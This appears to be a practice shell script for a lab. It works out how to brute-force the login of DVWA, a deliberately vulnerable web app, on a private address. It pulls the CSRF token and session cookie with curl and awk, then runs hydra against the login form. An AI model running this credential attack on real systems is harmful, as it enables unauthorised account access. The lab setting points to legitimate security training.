#Get an idea of what a login looks like
# curl -s -i -L 192.168.178.98/dvwa > root
#
#Capture raw HTTP from a login attempt
# mitmproxy 
#
#Use that data to replay a login attempt
# curl -s -i -L -d $'username=username&password=password&Login=Login&user_token=5660512c80e2ba3f7f9e2ac1dacb6856' 192.168.178.98/dvwa/login.php > test
#
#Check for differences between server's replies
# diff root test
#
#Get the CSRF token from a reply for later use
# CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
#Send a new login request with this token
# curl -s -i -L -b dvwa.cookie -d $'username=username&password=password&Login=Login&user_token={CSRF}' 192.168.178.98/dvwa/login.php > try1
#Check for differences again
# diff test try1
#
#Figure out how to use CSRF token
CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
# curl -s -i -L -b dvwa.cookie -d $'username=username&password=password&Login=Login&user_token={CSRF}' 192.168.178.98/dvwa/login.php > try1
# curl -s -i -L -b dvwa.cookie -d $'username=test&password=test&Login=Login&user_token={CSRF}' 192.168.178.98/dvwa/login.php > try2
# curl -s -i -L -b dvwa.cookie -d $'username=foo&password=bar&Login=Login&user_token={CSRF}' 192.168.178.98/dvwa/login.php > try3
#Check for differences between request with same token
# diff try1 try3
#
#Get php session id
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
#Figure out how to use hydra for this purpose
rm -f hydra.restore
hydra -l admin -p password -u -F -t 1 -w 10 -W 1 -V 192.168.178.98 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=${CSRF}:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}:C=/404.php"
